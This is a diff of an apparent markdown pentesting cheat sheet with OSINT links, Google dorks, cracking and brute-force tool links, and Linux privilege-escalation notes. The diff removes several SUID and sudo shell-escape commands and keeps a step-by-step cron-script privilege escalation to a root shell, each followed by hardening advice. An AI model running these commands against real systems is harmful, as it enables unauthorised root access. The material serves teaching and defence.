@@ -2,7 +2,6 @@
 
 Easy lookup data
 * [OSINT Framework](https://osintframework.com/) - Comprehensive site referrer
-
 * [Nmmapper - Multiple OSINT Tools](https://www.nmmapper.com/)
 * [IP Lookup](https://iplocation.io/)
 * [Registrar & DNS Lookup](https://www.nslookup.io/)
@@ -25,8 +24,6 @@ Easy dorks
    * `site:codepen.io "targetsite.com"`
 * Find php files with ext:php, eg. `site:targetsite.com ext:php inurl:?`
 * Check Disclosed Bug Bounties with openbugbounty.org, eg. `site:openbugbounty.org inurl:reports intext:"targetsite.com"`
-
-
 ## OSINT Tools
 * [Maltego](https://www.maltego.com/) - Relationships among people, companies, domains and publicly accessible information
 * [Mitaka](https://chrome.google.com/webstore/detail/mitaka/bfjbejmeoibbdpfdbmbacmefcbannnbg) - Chrome Extension that searches IP addresses, domains, URLs, hashes, ASNs, Bitcoin wallet addresses, and various indicators of compromise (IOCs) from your web browser.
@@ -65,21 +62,18 @@ Easy dorks
 * [Phishing Windows Credentials](https://pentestlab.blog/2020/03/02/phishing-windows-credentials/)
     * [FakeLogonScreen](https://github.com/bitsadmin/fakelogonscreen)
 
-## Tools
+# References
 
 * [Pentesttools.net](https://pentesttools.net/)
 * [Hacking Tools RESOURCE](https://en.m.wikibooks.org/wiki/Hacking/Tools) - Comprehensive Resource
 * [SecLists](https://github.com/danielmiessler/SecLists) - Comprehensive security lists for fuzzing, username/password, payloads, ect 
 * [Wordlists & Rainbow Tables for WEP/WPA/WPA2](https://wifi0wn.wordpress.com/wepwpawpa2-cracking-dictionary/)
 * [Book of Secret Knowledge](https://github.com/trimstray/the-book-of-secret-knowledge#hackingpenetration-testing-toc) - Huge reference for various IT
-
-
-### OS
+### Operating Systems
 * [Kali Linux](https://www.kali.org/)
     * [Kali’s Default Credentials (and tools shipped with)](https://www.kali.org/docs/introduction/default-credentials/)
 * [ParrotOS]
 * [BlackArch] 
-
 ### Brute Force Tools
 * Cracking
    * [John the Ripper](https://www.openwall.com/john/) Brute-force password tester
@@ -89,17 +83,15 @@ Easy dorks
        - [How to crack passwords with Hashcat](https://geekflare.com/password-cracking-with-hashcat/) 
        - [CrackQ on GitHub](https://github.com/f0cker/crackq)
        - [CrackQ (GUI Interface with automation)](https://www.helpnetsecurity.com/2019/12/04/password-cracking-pentesters/)
-    
    * [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=getting_started) - WiFi DeAuth attack
        - [How To Use Aircrack-ng](https://techofide.com/blogs/how-to-use-aircrack-ng-aircrack-ng-tutorial-practical-demonstration/)
        - [wikiHow - Cracking WPA/WPA2](www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux)
 * Logins
-   * [Hydra](https://www.kali.org/tools/hydra/) - Login attack tool
-       - [How to Use Hydra - SSH Password Spraying, Dictionary Attacks, ect](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/)
-       - [How to use Hydra to Brute-Force SSH Connections](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
-       - [Hydra Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)   
-   * [Medusa](https://github.com/jmk-foofus/medusa) - Speedy, parallel, and modular, login brute-forcer
-
+	- [Hydra](https://www.kali.org/tools/hydra/) 
+		- [Using Hydra - SSH Password Spraying, Dictionary Attacks, ect](https://www.freecodecamp.rg/news/how-to-use-hydra-pentesting-tutorial/)
+		- [Hydra to Brute-Force SSH Connections](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
+		- [Hydra Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)   
+	- [Medusa](https://github.com/jmk-foofus/medusa) - Speedy, parallel, and modular, login brute-forcer
 ###  Web Vulnerability Scanning
 * [Nessus](https://www.tenable.com/products/nessus/nessus-professional) - Vulnerability scanner
    * [Nessus Docker Image](https://hub.docker.com/r/tenableofficial/nessus)
@@ -170,19 +162,14 @@ Easy dorks
     * [Unofficial Guide & Command Reference](https://adsecurity.org/?page_id=1821)
     * [Blog - What is Mimikatz (Beginners Guide)](https://www.varonis.com/blog/what-is-mimikatz)
 * [Ettercap](https://www.ettercap-project.org/) - Man in the middle attack platform
-
 ### C2 Platforms
 * [Merlin](https://github.com/Ne0nd0g/merlin) 
-
 ## Linux Specific Techniques
 
 ### Privilege Escalation
 * [Basic Linux Privilege Escalation [Cheat sheet]](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
-* [How to conduct Linux privilege escalations](https://www.techtarget.com/searchsecurity/feature/How-to-conduct-Linux-privilege-escalations)
-* [Broad Guide to Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
 
 **<span style="text-decoration:underline;">Kernel Exploits </span>**
-
 For a kernel exploit attack to succeed, four conditions are required:
 * A vulnerable kernel
 * A matching exploit
@@ -215,26 +202,12 @@ _Example_: [PwnKit](https://arstechnica.com/information-technology/2022/01/a-bug
 
 “Set user ID” executes file permissions with a specific user using ‘s’ instead of ‘x’ in the permission set (eg. -rwsr-xr-x allows low privilege users to execute with root privileges). 
 
-<span style="text-decoration:underline;">Nmap “Escape to Shell” Exploit (Older versions of nmap)</span>
-
-* Find executables with SUID bit set: find / -perm -u=s -type f 2>/dev/null
-* Confirm nmap has SUID bit set: ls -la /usr/local/bin/nmap
-* Run nmap in Interactive Mode: nmap --interactive
-* Escape to the shell as root: !sh
-
 Avoid this by:
 * Never set SUID on any program that allows escape to shell
 * Never set SUID on any editor/comiler/interpreter
 
 **<span style="text-decoration:underline;">SUDO Exploits</span>**
 Misconfigured SUDO rights can allow root access through programs that edit code or allow escape to the shell
-
-<span style="text-decoration:underline;">Cmd Execute “Escape to Shell” Exploitls </span>
-* Determine commands that run as SUDO: sudo -l
-* Find command’s execute parameter: sudo find /home -exec sh -i \;
-
-<span style="text-decoration:underline;">Python “Shell Spawn” Exploit</span>
-* Spawn a python shell: sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
 
 Avoid this by:
 * Never give SUDO to any program that allows escape to shell
@@ -244,14 +217,14 @@ Avoid this by:
 cron jobs usually run with root privilege to poorly configured cron files can allow arbitrary code to be executed
 
 <span style="text-decoration:underline;">World-writable cron script Exploit</span>
-* Print world-writeable files find / -perm -2 -type f 2>/dev/null
-* Confirm cron file is writeable ls -la /usr/local/sbin/cron-logrotate.sh
-* Write C file in /tmp cd /tmp then vi rootme.c
-* Compile C file cat rootme.c
+* Print world-writeable files `find / -perm -2 -type f 2>/dev/null`
+* Confirm cron file is writeable `ls -la /usr/local/sbin/cron-logrotate.sh`
+* Write C file in /tmp `cd /tmp` then `vi rootme.c`
+* Compile C file `cat rootme.c`
 * Change exec owner & group to root
-echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;” >/usr/local/sbin/cron-logrotate.sh
-* After 5 mins confirm C file root privilege ls -la rootme
-* Run file to spawn root shell ./rootme
+`echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;” >/usr/local/sbin/cron-logrotate.sh`
+* After 5 mins confirm C file root privilege `ls -la rootme`
+* Run file to spawn root shell `./rootme`
 
 Avoid this by:
 * Scripts & binaries in cron jobs should not be writable
